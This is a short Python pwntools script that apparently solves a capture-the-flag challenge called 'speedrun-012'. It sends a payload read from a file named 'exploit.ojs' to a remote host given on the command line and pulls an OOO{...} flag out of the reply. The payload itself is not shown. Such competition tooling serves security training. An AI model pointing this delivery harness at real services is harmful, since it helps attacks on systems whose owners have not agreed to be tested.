#!/usr/bin/env python2
import sys
import time
from pwn import *
from struct import pack

context.log_level = logging.DEBUG

def get_connection():
    # conn = process("./speedrun-012")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    # gdb.attach(conn, '''
    # continue
    # ''')

    return conn

conn = get_connection()

p = open("exploit.ojs", "rb").read()

conn.send(p)

result = conn.recvall(timeout=1)
flag = re.search('OOO{[^}]+}', result)
print("FLAG: %s" % flag.group(0))
